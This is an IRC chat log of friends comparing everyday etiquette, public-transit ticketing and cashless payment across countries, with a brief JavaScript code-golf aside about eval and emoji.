Jun 21 10:37:24 <shikhin>	er, stop information
Jun 21 10:37:29 <vehk>	Ah yes, we have that too
Jun 21 10:37:35 <vehk>	Plus an electronic voice
Jun 21 10:37:35 <S_Gautam>	Yeah, German words seem pretty long
Jun 21 10:38:04 <nortti>	< vehk> I mean people actually thank the driver when they're getting off ← we do that here too, if you're not in either of the big cities. or, well, depends on the person, but many do
Jun 21 10:38:25 <vehk>	Can't really thank train staff here but should I ever take the bus again here, I'll start doing that as well
Jun 21 10:38:33 <vehk>	I'm sure they'll think I'm strange, but whatever
Jun 21 10:38:36 <vehk>	It's nice
Jun 21 10:39:03 <nortti>	do you thank when leaving a grocery store?
Jun 21 10:39:07 <vehk>	Oh, definitely
Jun 21 10:39:11 <vehk>	Although not everyone does
Jun 21 10:39:19 <nortti>	ah
Jun 21 10:39:22 <nortti>	same
Jun 21 10:39:27 <vehk>	And, well, it's different how you interact
Jun 21 10:39:39 <vehk>	When I was in Bristol in a shop they asked me whether I wanted the receipt
Jun 21 10:39:46 <shikhin>	Even if you use the self checkout machines?
Jun 21 10:39:48 <vehk>	I said "no", and later ybden told me I was being rude
Jun 21 10:39:52 <shikhin>	o.o
Jun 21 10:39:52 <vehk>	Because I didn't say "no, thanks"
Jun 21 10:39:55 <shikhin>	Ah.
Jun 21 10:40:05 <shikhin>	Thought you meant "no" was rude, they felt bad you didn't want the receipt.
Jun 21 10:40:09 <vehk>	It's not considered rude to just say no here, so...
Jun 21 10:40:12 <vehk>	Ah, haha
Jun 21 10:40:20 <S_Gautam>	is it socially acceptable to ask for a discount
Jun 21 10:40:29 <nortti>	shikhin: in here, there's usually a person by the checkout, to assist in case there's trouble. they go "<good rest-of-the-day>" when you leave
Jun 21 10:40:41 <vehk>	Right, yeah. I generally wish people a nice day.
Jun 21 10:40:45 <shikhin>	Ah.
Jun 21 10:40:50 <john_cephalopoda>	I definitely say thanks when I finished paying at stores, also I wish a nice day or a nice weekend when it's Friday or Saturday.
Jun 21 10:41:02 <nortti>	S_Gautam: at least in finland, not really
Jun 21 10:41:15 <vehk>	And no, no discounts.
Jun 21 10:41:16 <shikhin>	S_Gautam's message reminds me… my sister was fairly surprised when I told her that Indians are stereotyped for bargaining in foreign countries.
Jun 21 10:41:21 <vehk>	Cashiers can't do anything about this anyway
Jun 21 10:41:26 <vehk>	They don't own the store :D:
Jun 21 10:41:42 <john_cephalopoda>	"<good rest-of-the-day>-vittu-perkele"
Jun 21 10:41:47 <nortti>	< vehk> In the UK (or at least the line I took) they didn't even announce the stops ← they don't do it here (at least not in oulu or tampere, and I don't remember it from helsinki either), so it was kinda surprise to see that in sweden. we do have the stop name displays as of 10 years back or so
Jun 21 10:41:54 <vehk>	Mh
Jun 21 10:41:59 <nortti>	well, most busses do, not all
Jun 21 10:42:03 <S_Gautam>	shikhin: i have to admit
Jun 21 10:42:03 <vehk>	I find this so weird when you go somewhere you've never been
Jun 21 10:42:06 <shikhin>	One of the weirder things in the US is people asking "How's it going?"  I have seen people comletely ignore the question, but that feels fairly rude.
Jun 21 10:42:17 <S_Gautam>	i have done bargaining myself
Jun 21 10:42:31 <john_cephalopoda>	When I was in the UK, I had to wave to the bus so it would stop. The driver wouldn't just look for himself if people looked like they want to drive.
Jun 21 10:42:58 <S_Gautam>	"25 per mango" "Come on, uncle, 15?" "15? Are you kidding me?" "20 then?" "25." "20. Pls" "Ok"
Jun 21 10:42:59 <vehk>	shikhin: Hm. Ignoring it definitely feels weird.
Jun 21 10:43:11 <vehk>	Dunno, seems like a nice enough (albeit superficial, but oh well) sentiment
Jun 21 10:43:23 <shikhin>	vehk: Right, but people do it all the time, both with friends and staff at places.
Jun 21 10:43:28 <vehk>	Thing is that here the expected answer would generally be "I'm doing well"
Jun 21 10:43:33 <vehk>	So if you're really depressed, well
Jun 21 10:43:37 <nortti>	< vehk> When I was in Bristol in a shop they asked me whether I wanted the receipt   < vehk> I said "no", and later ybden told me I was being rude   < vehk> Because I didn't say "no, thanks" ← hm, I'd say either "<no, thanks>" or "<I do not need a receipt>" (if they haven't yet asked)
Jun 21 10:43:45 <john_cephalopoda>	shikhin: I bet they would ignore it or say "I'm fine" even when they are dead sick and about to collapse and die. While in various other countries you'll get their whole medical history.
Jun 21 10:43:48 <shikhin>	I just shake my head.
Jun 21 10:43:54 <vehk>	haha
Jun 21 10:44:01 <shikhin>	(Not joking!)
Jun 21 10:44:16 <vehk>	It is not going, Allah is going.
Jun 21 10:44:30 <vehk>	Actually, long time no spam like that
Jun 21 10:44:31 <shikhin>	C-context?
Jun 21 10:44:44 <vehk>	Remember "the sun is not doing, allah is doing"?
Jun 21 10:44:49 <shikhin>	N-no.
Jun 21 10:44:50 <vehk>	Or whatever that was
Jun 21 10:44:54 <shikhin>	Is that from a movie we saw?
Jun 21 10:44:55 <john_cephalopoda>	Is Allah doing the sun?
Jun 21 10:45:04 <vehk>	shikhin: No, freenode spam
Jun 21 10:45:04 <S_Gautam>	blasphemous 
Jun 21 10:45:07 <shikhin>	Oh.
Jun 21 10:45:15 <john_cephalopoda>	S_Gautam: I'm not judging, the sun is definitely hot.
Jun 21 10:45:17 <vehk>	< Guest_84747> Allah is doing  < Guest_84747> sun is not doing Allah is doing  < Guest_84747> moon is not doing Allah is doing
Jun 21 10:45:21 <shikhin>	:D
Jun 21 10:45:29 <S_Gautam>	john_cephalopoda: oo
Jun 21 10:45:30 <vehk>	It was in lots of places
Jun 21 10:45:39 <shikhin>	Remember vaguely now.
Jun 21 10:45:58 <vehk>	nortti: Mh. I'd actually have to actively remember to say "no, thanks"
Jun 21 10:46:05 <vehk>	Thing is, it
Jun 21 10:46:09 <nortti>	actually, reminds me of a time I was at the uni cafeteria. the entire customer service enouncer: me: *hold up student ID for discount*   cashier: "<thanks>" *punches the price* "<2 60 thanks>"   me: *places the card and pays* "<thanks>"   cashier: *confirms it went through* "<thanks>"   me: (as a "bye") "<thanks>"
Jun 21 10:46:15 <S_Gautam>	fuck off now I have a weird boner because Surya is actually a god in Hinduism
Jun 21 10:46:20 <vehk>	's different when you say "Nein", compared to, say, "Ne"
Jun 21 10:46:26 <vehk>	Where if you say Nein, you definitely mean business
Jun 21 10:46:30 <vehk>	And Ne is just more friendly?
Jun 21 10:46:33 <nortti>	mh
Jun 21 10:46:38 <FireFly>	Heh
Jun 21 10:46:57 <shikhin>	vehk: The easier solution (and dammit, nortti pre-empted) me is to just say "thanks" in response to every question and let them interpret that however they want to.
Jun 21 10:46:59 <nortti>	(finnish has no "please" so we use "thanks" similarily sometimes)
Jun 21 10:47:03 <vehk>	mh, I see
Jun 21 10:47:11 <vehk>	shikhin: Right
Jun 21 10:47:20 <FireFly>	Just a "nä" would be fine here
Jun 21 10:47:22 <S_Gautam>	what's wrong with saying No?
Jun 21 10:47:40 <shikhin>	I say "thanks" a fair amount, but that has the side-effect of sometimes saying "thanks" in response to the wrong question.
Jun 21 10:47:42 <S_Gautam>	Nahin, theek hai. (No, it's ok)
Jun 21 10:47:43 <vehk>	"You're being detained. You have the right to remain silent"
Jun 21 10:47:45 <vehk>	"Thanks"
Jun 21 10:47:50 <FireFly>	shikhin: presumably that would be interpreted as "yes" though?
Jun 21 10:47:55 <FireFly>	"would you like a receipt?" "thanks"
Jun 21 10:48:00 <shikhin>	FireFly: At least you weren't rude.
Jun 21 10:48:04 <FireFly>	lol
Jun 21 10:48:09 <S_Gautam>	"would you like to go out on a date?" "thanks"
Jun 21 10:48:09 <nortti>	< john_cephalopoda> "<good rest-of-the-day>-vittu-perkele" ← hm, I'd segment that as you saying <good rest-of-the-day> to someone whose name is vittuperkele
Jun 21 10:48:29 <john_cephalopoda>	"Did you know that I lost my whole family in a tragic car crash?" - "Thanks."
Jun 21 10:48:34 <vehk>	S_Gautam: Nothing is "wrong" with saying no, but there's different ways of saying no
Jun 21 10:48:35 <shikhin>	Relevant https://twitter.com/leyawn/status/1008059240056020992
Jun 21 10:48:35 <bslsk05>	​twitter: <leyawn> said thank you too loud when i got my coffee this morning. going to be thinking about this for the rest of the day now
Jun 21 10:48:40 <FireFly>	"nä, det är bra" (or more like "nädeebra") is pretty common here
Jun 21 10:48:50 <FireFly>	lit. "no, it's good"
Jun 21 10:49:05 <shikhin>	S_Gautam: Right, it's polite here to say "nahin, theek hai" but e.g. "na" sounds a bit harsher.
Jun 21 10:49:08 <john_cephalopoda>	nortti: So you know somebody who has the name vittuperkele?
Jun 21 10:49:26 <S_Gautam>	shikhin: "No" is even more aggressive 
Jun 21 10:49:37 <shikhin>	Yeah.
Jun 21 10:49:44 <vehk>	shikhin: Also don't you just love it when you get mixed up and accidentally say "thanks, you too" where it's not appropriate?
Jun 21 10:49:53 <vehk>	"Here's your boarding pass, have a nice flight!" "Thanks, you too!"
Jun 21 10:50:00 *	shikhin nods vigorously.
Jun 21 10:50:16 <john_cephalopoda>	"Did you know that I lost my whole family in a tragic car crash?" "Thanks, you too!"
Jun 21 10:50:19 <shikhin>	vehk: At the college cafetaria, "Have a nice class!" "Thanks, you too!"
Jun 21 10:50:22 <vehk>	haha
Jun 21 10:50:33 <john_cephalopoda>	Heh
Jun 21 10:50:51 <FireFly>	"That's 40 kr, please" "thanks, you too"
Jun 21 10:50:58 <vehk>	I should pull that one sometimes
Jun 21 10:51:48 <vehk>	I think most embarrassing, though, is when you have to insert your credit card into the reader yourself at supermarkets
Jun 21 10:51:58 <vehk>	I swear, most of them have the most confusing icons for which way to insert it
Jun 21 10:52:06 <zgrep>	vehk: That's when you pull out a second ticket and hand it to them.~5
Jun 21 10:52:13 <vehk>	:p
Jun 21 10:53:13 <vehk>	Or generally using self-checkout machines (did that in the UK at Tescos)
Jun 21 10:53:17 <vehk>	It's the worst.
Jun 21 10:53:18 <shikhin>	vehk: Had a fun encounter the first time I encountered a reader in Switzerland, where there was a (not very well marked) slot at the top of the machine that you put the card into.
Jun 21 10:53:32 <vehk>	"Return your item to the bagging area" "I did that, you twat" "Return your item to the bagging area"
Jun 21 10:53:45 <shikhin>	vehk: Cashier kept trying to tell me to tap my card against the machine (since I couldn't figure out where the chip reader is), I kept trying to tell them that my card doesn't work with a tap.
Jun 21 10:53:50 <vehk>	Oooh
Jun 21 10:53:55 <vehk>	Was it resolved?
Jun 21 10:54:14 <shikhin>	They took my card and tapped it half a dozen times before being convinced that won't work.
Jun 21 10:54:19 <vehk>	:D:
Jun 21 10:54:33 <S_Gautam>	hm, I just realized talking in English with people I know well or old people seems condescending and rude
Jun 21 10:54:48 <shikhin>	What's wrong with the chip readers being placed at the user-end of the reader? :<
Jun 21 10:54:49 <vehk>	Of course the Tesco machines then say "Help is coming!" and lock the interface until someone can check what's going on
Jun 21 10:55:00 <vehk>	But what also happens is that it can correct itself whilst saying that message
Jun 21 10:55:09 <john_cephalopoda>	shikhin: Do it like the Germans, pay in cash.
Jun 21 10:55:13 <vehk>	So what ybden and I were witnessing once was a machine screaming "Help!"
Jun 21 10:55:17 <vehk>	It was glorious
Jun 21 10:55:18 <shikhin>	:D
Jun 21 10:55:36 <shikhin>	S_Gautam: *nod*
Jun 21 10:55:47 <S_Gautam>	john_cephalopoda: he will have to make sure his cash doesn't get obsolete after another demonitization purge 
Jun 21 10:55:59 <john_cephalopoda>	S_Gautam: Use Euros.
Jun 21 10:56:23 <shikhin>	john_cephalopoda: That was the day I landed, though––don't carry cash myself.
Jun 21 10:56:35 <S_Gautam>	shikhin: i used to switch to regional dialect during high school to score "innocent" guy points from teachers, it worked well.
Jun 21 10:56:48 <shikhin>	What regional dialect?
Jun 21 10:57:00 <vehk>	Mh. I'll stop bringing cash to the UK, just no use.
Jun 21 10:57:01 <john_cephalopoda>	shikhin: "I don't carry cash. I carry a concealed gun. Way cheaper way to get the things I want."
Jun 21 10:57:14 <vehk>	Which is weird when you're used to carrying cash because places don't necessarily support cards
Jun 21 10:57:15 <S_Gautam>	shikhin: magahi (Southern Bihar)
Jun 21 10:57:24 <shikhin>	Interesting.
Jun 21 10:57:37 <shikhin>	vehk: Oh? What sorts of places?
Jun 21 10:57:40 <john_cephalopoda>	vehk: A world without cash is so 1984.
Jun 21 10:57:59 <shikhin>	Not necessarily.
Jun 21 10:58:08 <vehk>	shikhin: It's smaller places, like bakeries, fast food stores, that sort of thing. Some supermarket chains still, with some cards
Jun 21 10:58:17 <S_Gautam>	hm apparently the original Siddharth Gautam spoke Magahi
Jun 21 10:58:21 <shikhin>	vehk: Even in cities?
Jun 21 10:58:28 <vehk>	Also, at least in Karlsruhe, you can't pay for your tram ticket with a credit card
Jun 21 10:58:31 <vehk>	Yeah
Jun 21 10:58:34 <S_Gautam>	should i give up science and move to Nepal for englightenment for the second coming of Buddha?
Jun 21 10:58:35 <shikhin>	Huh.
Jun 21 10:59:57 <shikhin>	Sounds fun.
Jun 21 11:00:02 <vehk>	Hm. Do you all also have to sign your train tickets? Or at least some of them?
Jun 21 11:00:10 <shikhin>	N-no?
Jun 21 11:00:21 <shikhin>	To verify it's you?
Jun 21 11:00:24 <olsner>	I've never heard of that either
Jun 21 11:00:35 <vehk>	You have to do that here for at least the tickets with which you can travel anywhere on a specific day (which you can name, for example)
Jun 21 11:00:42 <vehk>	Or generally some special tickets
Jun 21 11:00:46 <vehk>	shikhin: Yes
Jun 21 11:00:53 <vehk>	Well, to mark it as used and verify
Jun 21 11:01:00 <vehk>	(Because you have to carry ID in Germany)
Jun 21 11:01:12 <vehk>	(And no, nobody checks)
Jun 21 11:01:24 <vehk>	(The ID, that is, they do check whether it's signed)
Jun 21 11:01:28 <shikhin>	Is there any purpose to having tickets with the name of the individuals on them anyway?
Jun 21 11:01:42 <S_Gautam>	vehk: nowadays they just mail a PDF with your credentials and the TT confirms the details in the document, I think
Jun 21 11:01:46 <vehk>	You can technically reuse certain kinds of tickets if you don't sign them
Jun 21 11:01:49 <vehk>	That's why they make you sign it
Jun 21 11:01:58 <olsner>	technically tickets are personal (for price control, to prevent second-hand resale) here, but it's almost never checked
Jun 21 11:02:03 <shikhin>	Ah, can make the conductor punch them or something.
Jun 21 11:02:05 <shikhin>	But sure.
Jun 21 11:02:12 <vehk>	Right, that happens /anyway/
Jun 21 11:02:15 <vehk>	I don't know, it is stupid
Jun 21 11:02:16 *	shikhin blinks.
Jun 21 11:02:37 <olsner>	sometimes the conductor signs the ticket instead of punching
Jun 21 11:02:42 <shikhin>	olsner: That's also easily prevented by punching them / signing them.
Jun 21 11:02:55 <S_Gautam>	i once met a kid while travelling on a train, apparently he used to hide under the train seats and that's how he used to travel between towns
Jun 21 11:02:56 <vehk>	That happens in the UK at least, yeah, where they sign it.
Jun 21 11:03:06 <S_Gautam>	(where he used to study and where his family was)
Jun 21 11:03:09 <olsner>	shikhin: this is before you use the ticket, it's not punched until you use it, and once used it's worthless to everyone
Jun 21 11:03:25 <vehk>	Nowadays I just use mobile tickets on my phone, though, so the conductor just has to scan the QR code
Jun 21 11:03:30 <shikhin>	olsner: Oh, d'oh, I see.
Jun 21 11:03:47 <shikhin>	I guess that is an advantage, yes, hm.
Jun 21 11:04:02 <vehk>	I found a way to reuse tickets anyway, it's really not useful
Jun 21 11:04:10 <vehk>	When I was still studying I used some tickets up to three times
Jun 21 11:04:13 <vehk>	*shrug*
Jun 21 11:04:24 <zgrep>	I was on a train with an eTicket a couple of times.
Jun 21 11:04:36 <zgrep>	Both times they just checked that I had something that flashed colors on my screen.
Jun 21 11:04:50 <zgrep>	They never actually verified it.
Jun 21 11:04:51 <vehk>	Oh yes, that's what they do in the UK as well. Really weird and easy to fake, I bet
Jun 21 11:04:57 <shikhin>	I mean my family and I got onto the wrong train and travelled to a new town without it being covered by our pass and the conductor didn't charge us because "whoops wrong train we're not from here", so I suppose you could just do that always.
Jun 21 11:05:04 <vehk>	Thing is, the tickets in the UK (at least with trainline) have a QR code
Jun 21 11:05:08 <vehk>	But they don't verify it
Jun 21 11:06:05 <shikhin>	Oh, right; the tickets all were compared against some printed list or had a QR code, but our pass was just a piece of paper with no special information on it?
Jun 21 11:06:06 <vehk>	What I'll never understand is turnstiles that want your ticket so you can actually get to the platform
Jun 21 11:06:16 <vehk>	Like, people who don't have a ticket can't even wait with you on the platform
Jun 21 11:06:26 <shikhin>	Or turnstiles that want your ticket to exit…
Jun 21 11:06:31 <vehk>	Blows my mind every time. Here there's no turnstiles, you can just go anywhere
Jun 21 11:06:35 <vehk>	Oh yes
Jun 21 11:06:37 <S_Gautam>	do you guys have armed personnel on stations now?
Jun 21 11:06:38 <vehk>	Fuck that
Jun 21 11:06:42 <puckipedia>	so we have those here in NL
Jun 21 11:06:50 <puckipedia>	like, you need a ticket to enter/exit most station platforms
Jun 21 11:06:58 <puckipedia>	but there's a few things
Jun 21 11:06:59 <vehk>	Someone explain why this is useful?
Jun 21 11:07:07 <S_Gautam>	nowadays, you need to be scanned by army dudes to enter a metro station
Jun 21 11:07:07 <shikhin>	Recycling the tickets, possibly?
Jun 21 11:07:20 <puckipedia>	one: most of our travel in NL is pay as you go, as it isn't cheaper to book beforehand
Jun 21 11:07:30 <puckipedia>	they're either reusable smartcards or (rarely) single-use smartcards
Jun 21 11:07:58 <shikhin>	S_Gautam: That's always been the case for Delhi metro, but not army, CISF.
Jun 21 11:08:12 <S_Gautam>	right CISF
Jun 21 11:08:16 <S_Gautam>	paramilitary 
Jun 21 11:08:22 <puckipedia>	second: so, at the same time, if you leave at the same station you entered at within 30 minutes, it doesn't actually deduct any money
Jun 21 11:08:26 <vehk>	puckipedia: Mh, I like the pay as you go idea - if it is cheap enough
Jun 21 11:08:35 <S_Gautam>	just use tokens? 
Jun 21 11:08:39 <S_Gautam>	like plastic coins
Jun 21 11:08:51 <S_Gautam>	with some inscribed scannable code 
Jun 21 11:08:53 <puckipedia>	vehk: seriously there's /no/ discount if you buy tickets beforehand
Jun 21 11:08:56 <vehk>	puckipedia: So do they actually check for your ticket *on* the train?
Jun 21 11:09:03 <puckipedia>	vehk: oh they do
Jun 21 11:09:08 <puckipedia>	not quite as bad as .de but
Jun 21 11:09:17 <shikhin>	vehk: Oh wait, the tickets are checked on the train even after the turnstiles?
Jun 21 11:09:18 <puckipedia>	(I never had to show my ID)
Jun 21 11:09:28 <vehk>	Well, "as bad as .de" really is just "well, there's no turnstiles, so we check everyone"
Jun 21 11:09:34 <vehk>	And they don't usually check your ID here either
Jun 21 11:09:43 <puckipedia>	the one time I traveled they checked my id
Jun 21 11:09:45 <vehk>	shikhin: Yes, in the UK at least
Jun 21 11:09:47 <puckipedia>	which is infinitely more than in NL
Jun 21 11:09:50 <shikhin>	Never been anywhere with both turnstiles + tickets being checked on the train, that's plain weird. o.o
Jun 21 11:09:51 <vehk>	haha
Jun 21 11:09:54 <vehk>	puckipedia: Sure, that's fair
Jun 21 11:10:00 <vehk>	shikhin: Yes, my point
Jun 21 11:10:10 <vehk>	I understand either turnstiles or checking on the train
Jun 21 11:10:13 <vehk>	Not both
Jun 21 11:10:18 <puckipedia>	the ticket checking is quite rare
Jun 21 11:10:32 <vehk>	How rare, would you say?
Jun 21 11:11:01 <puckipedia>	I have a check like once in ten times I travel with the train?
Jun 21 11:11:15 <vehk>	< puckipedia> the one time I traveled they checked my id <- Maybe this is a thing in ICEs, then
Jun 21 11:11:18 <shikhin>	(Also every country I've been to has had paper tickets for metros. I like Delhi's reusable tokens.)
Jun 21 11:11:21 <vehk>	Then again I travel IC/TGV...
Jun 21 11:11:26 <FireFly>	puckipedia: that is super frequent
Jun 21 11:11:27 <john_cephalopoda>	In regional trains ticket checking is not done all the time, in ICE it is definitely more common.
Jun 21 11:11:32 <puckipedia>	or well, probably slightly less
Jun 21 11:11:32 <puckipedia>	hmm
Jun 21 11:11:44 <vehk>	john_cephalopoda: But IDs?
Jun 21 11:11:51 <puckipedia>	I wonder
Jun 21 11:12:01 <FireFly>	I've been checked like once or twice in the past 9 mo of daily commuting to/from work?
Jun 21 11:12:11 <shikhin>	Oh hey, I took an ICE train.
Jun 21 11:12:21 <vehk>	FireFly: Is that tram?
Jun 21 11:12:21 <puckipedia>	... did I have the ICE
Jun 21 11:12:31 <shikhin>	They checked tickets; didn't ask for my passport, asked for the passport of the person sitting next to me.
Jun 21 11:12:31 <FireFly>	vehk: local-transit train
Jun 21 11:12:34 <vehk>	Huh
Jun 21 11:12:37 <vehk>	Do you have turnstiles?
Jun 21 11:12:39 <puckipedia>	FireFly: hm, which distance on average?
Jun 21 11:12:43 <FireFly>	vehk: yeah, we do
Jun 21 11:12:45 <vehk>	ah
Jun 21 11:12:48 <FireFly>	this is checks in addition to turnstiles
Jun 21 11:12:51 <vehk>	shikhin: what... :D:
Jun 21 11:12:51 <puckipedia>	like, these trains go through the entirety of NL
Jun 21 11:12:58 <vehk>	shikhin: Oh, I guess this was the border?
Jun 21 11:13:03 <shikhin>	vehk: Nope.
Jun 21 11:13:04 <FireFly>	puckipedia: these are within Stockholm, my commute is 25 min or so each way
Jun 21 11:13:06 <john_cephalopoda>	vehk: They only check my BahnCard 50 here. Tickets are bound to the name of the one who drives, so checking that probably makes sense in some cases.
Jun 21 11:13:14 <john_cephalopoda>	(If you get them online)
Jun 21 11:13:16 <vehk>	Well, yes, BC 50 they do check
Jun 21 11:13:18 <FireFly>	the national/regional trains are chceked
Jun 21 11:13:18 <vehk>	Sometimes...
Jun 21 11:13:20 <vehk>	shikhin: Weird.
Jun 21 11:13:25 <shikhin>	vehk: At the border… lots of armed guards entered. They talked to someone sitting at the front, then told (?) them to deboard, and that was that. Seemed like a lot of activity.
Jun 21 11:13:29 <vehk>	Maybe I just look really non-ID-check-worthy
Jun 21 11:13:38 <FireFly>	Although the regional train I've been checked maybe hm.. like halfish the time?
Jun 21 11:13:38 <shikhin>	Yeah, I definitely look German.
Jun 21 11:13:46 *	vehk nods
Jun 21 11:13:56 <john_cephalopoda>	vehk: Gute Arier führen sicher nichts im Schilde.
Jun 21 11:14:04 <vehk>	...
Jun 21 11:14:08 <puckipedia>	...
Jun 21 11:14:23 <shikhin>	=tr Gute Arier führen sicher nichts im Schilde.
Jun 21 11:14:24 <Eldis4>	​shikhin: [de→en] Good Aryans certainly are up to no good.
Jun 21 11:14:27 <shikhin>	...
Jun 21 11:14:35 <john_cephalopoda>	...
Jun 21 11:14:52 <john_cephalopoda>	Google translate inverted the meaning.
Jun 21 11:14:54 <vehk>	Actually, another thing - I love how at Manchester airport they have like the biggest screens for the ticket machines at the train station
Jun 21 11:14:58 <vehk>	Everyone around you can see where you're going
Jun 21 11:15:02 <vehk>	It's creepy
Jun 21 11:15:24 <shikhin>	Ooh, I forgot to share this here, didn't I.
Jun 21 11:15:34 <FireFly>	<shikhin> Never been anywhere with both turnstiles + tickets being checked on the train, that's plain weird. o.o  <- lol, even with the occasional checks on trains even with turnstiles, there's some organistaions/groups advocating jumping the turnstiles :p
Jun 21 11:15:37 <john_cephalopoda>	vehk: Low-res surveillance cameras on the ceiling. They can't resolve the small screens :þ
Jun 21 11:15:46 <FireFly>	and stuff like "pay us X monthly and we'll back you up if you get caught"
Jun 21 11:15:55 <shikhin>	:D
Jun 21 11:15:56 <shikhin>	Cute.
Jun 21 11:15:57 <puckipedia>	once, I entered the train system in a station that doesn't yet have turnstiles
Jun 21 11:16:07 <puckipedia>	then I checked out
Jun 21 11:16:08 <FireFly>	well, I dunno if it's as much a thing still

Jun 21 11:16:15 <vehk>	I dunno, turnstiles instantly make me feel unfree
Jun 21 11:16:17 <FireFly>	I guess yeah
Jun 21 11:16:18 <puckipedia>	it broke things and just pulled like EUR 10 from my card
Jun 21 11:16:30 <vehk>	And then you get nice PA announcements in the UK to watch out for suspicious things
Jun 21 11:16:33 <shikhin>	https://photos.app.goo.gl/kWQ68TEAsehZAbje9

Jun 21 11:17:02 <vehk>	God, bitcoin
Jun 21 11:17:07 <shikhin>	Exactly.
Jun 21 11:17:09 <S_Gautam>	shikhin: someone didn't update the software since 2000

Jun 21 11:17:18 <vehk>	:D:
Jun 21 11:17:22 <FireFly>	shikhin: yes, but it used to depend on the distance travelled, but you had to keep track of it yourself and pay for the right distance ahead-of-time
Jun 21 11:17:24 <FireFly>	which was annoying
Jun 21 11:17:32 <vehk>	I dunno, the UK feels very... weird
Jun 21 11:17:40 <shikhin>	S_Gautam: > Top up Bitcoin
Jun 21 11:18:01 <shikhin>	FireFly: Err, do you enter train stations you're going to to pay, or do you have to actually enter the distance?
Jun 21 11:18:03 <FireFly>	vehk: I mean there's also the "secure beneath the watchful eye" ad from like 15 years ago
Jun 21 11:18:09 <vehk>	Right
Jun 21 11:18:11 <john_cephalopoda>	Blockchaintrain.
Jun 21 11:18:21 <vehk>	FireFly: There's some other ads right now that go towards that as well
Jun 21 11:18:51 <john_cephalopoda>	FireFly: There's also the "Big Brother is watching you" from 34 years ago.
Jun 21 11:18:53 <FireFly>	shikhin: er, neither. these days it's a flat rate, as mentioned, but it used to be divided into zones, and you paid for 2 coupons for travelling within one zone, + 1 coupon for each additional zone

Jun 21 11:19:07 <shikhin>	FireFly: Ah.
Jun 21 11:19:12 <vehk>	In Germany the biggest ads you usually see depict cartoon people about to have unprotected sex - and they tell you to use condoms
Jun 21 11:19:13 <john_cephalopoda>	S_Gautam: Also an app and a cloud.
Jun 21 11:19:24 <FireFly>	you could set a "default number of coupons", but if you wanted something other than your default, you had to press things to override it
Jun 21 11:19:26 <john_cephalopoda>	vehk: Oh, those are _everywhere_
Jun 21 11:19:27 <FireFly>	I never really quite got it
Jun 21 11:19:30 <shikhin>	vehk: …nice?

Jun 21 11:20:01 <S_Gautam>	Not our condom?
Jun 21 11:20:03 <john_cephalopoda>	Bbl~
Jun 21 11:20:22 *	shikhin has no idea what the biggest adverts in India are.
Jun 21 11:20:24 <FireFly>	S_Gautam: "not without a condom"--it was a silly thing in Link's awakening

Jun 21 11:36:33 <shikhin>	Ah, hehe.
Jun 21 11:37:03 <FireFly>	I have a loop with a single iteration variable, from which I derive X and Y
Jun 21 11:37:14 <shikhin>	S_Gautam: Basically what vehk said; at least I would've liked a tad more independence when I was younger.
Jun 21 11:37:31 <FireFly>	so that would be i%width, i/width|0 (floored division)
Jun 21 11:38:04 <FireFly>	well actually I do them the other way around, so that Y is i%height and X is i/height|0
Jun 21 11:38:15 <FireFly>	but anyway, it simplifies things if I just treat it as i/height
Jun 21 11:38:21 <shikhin>	Ah, hehe.
Jun 21 11:38:26 <shikhin>	Nice.
Jun 21 11:38:32 <FireFly>	which causes the drift to the right as y increases
Jun 21 11:38:43 <vehk>	I'd help with this if I could, but I have no clue what's going on, so...
Jun 21 11:38:51 *	shikhin nods, likewise.

Jun 21 11:39:45 <FireFly>	ah well
Jun 21 11:39:55 <vehk>	Is it actually using up lots of CPU, or is it something else?
Jun 21 11:40:08 <shikhin>	No dwitter channel / support or something?
Jun 21 11:40:23 <FireFly>	there is a JS golf slack that I used to hang out in, but I kinda left it a while ago
Jun 21 11:40:28 <vehk>	But I don't know, Firefox for me sometimes segfaults if I close HTML5 video content, so...

Jun 21 11:40:51 <shikhin>	vehk use is a fuck a lot recently.
Jun 21 11:41:03 <vehk>	Yes, got to get to the quota, then never mention it again
Jun 21 11:41:26 <FireFly>	also, so that mapping to moon glyphs is the best I have so far, but I had some other alternatives (that ended up being more verbose)
Jun 21 11:41:35 <FireFly>	I like this one: eval(`'\\u{1F31${'12a3aaa48aaa7a65'[P(0)+P(1)+P(2)+P(3)]}}'`)
Jun 21 11:41:39 <vehk>	You know everything is terrible when you think that "is horrible" is just not poignant anymore
Jun 21 11:41:52 <shikhin>	"is horrible" is a fuck?
Jun 21 11:41:56 <vehk>	:D
Jun 21 11:42:14 <FireFly>	or well, in general  eval(`'\\u{1F31${expr}}'`)
Jun 21 11:42:24 <shikhin>	What's that do?
Jun 21 11:42:43 <FireFly>	Insetad of String.fromCodePoint(127760+expr)
Jun 21 11:42:51 <vehk>	It prints a unicode char dynamically?
Jun 21 11:42:53 <FireFly>	(roughly, although with some differences)

Jun 21 11:43:46 <FireFly>	because eval will receive like, hm
Jun 21 11:44:00 <shikhin>	olsner: Good point.
Jun 21 11:44:12 <FireFly>	actually I think eval will ignore the second param, but it'll receive an array that will be coerced to string and then evaled back?
Jun 21 11:44:20 <FireFly>	eval`` is an interesting one to ponder
Jun 21 11:44:27 <puckipedia>	FireFly: mmm. it gets an array and a number
Jun 21 11:44:38 <FireFly>	yeah, and it'll ignore the number I'm pretty sure

Jun 21 11:45:03 <puckipedia>	FireFly: wow this is weird
Jun 21 11:45:04 <FireFly>	puckipedia: seems eval just returns the array if it receives an array

Jun 21 12:07:33 <shikhin>	Now to remove the items they're selling from the stores, and there'll be no incentive for robbery.
Jun 21 12:07:34 <vehk>	Plus credit scores
Jun 21 12:07:54 <FireFly>	nortti: yep
Jun 21 12:08:05 <nortti>	shikhin: then we could move the store online, and save on rent

Jun 21 12:09:05 <FireFly>	aaaaaaaaahhh
Jun 21 12:09:18 <FireFly>	I don't get why it's always annoying to hear $native-language-accented english :P
Jun 21 12:09:22 <nortti>	"Most of the country’s bank branches have stopped handling cash" what the fuck
Jun 21 12:09:28 <shikhin>	…what.
Jun 21 12:09:35 <FireFly>	nortti: oh, yes
Jun 21 12:09:40 <FireFly>	this is true
Jun 21 12:09:46 <vehk>	wow
Jun 21 12:09:48 <FireFly>	you can't deposit/withdraw cash in most bank branches
Jun 21 12:09:52 <shikhin>	…
Jun 21 12:10:12 <nortti>	what is the point of the branch, then? handling paperwork?
Jun 21 12:10:26 <shikhin>	Accepting new people.
Jun 21 12:10:41 <vehk>	Using the money that's on your account, obviously
Jun 21 12:10:50 <FireFly>	pretty much those things, yes
Jun 21 12:11:02 <FireFly>	also loans and stuff
Jun 21 12:11:10 <vehk>	< FireFly> I don't get why it's always annoying to hear $native-language-accented english :P <- Hm, I don't have that
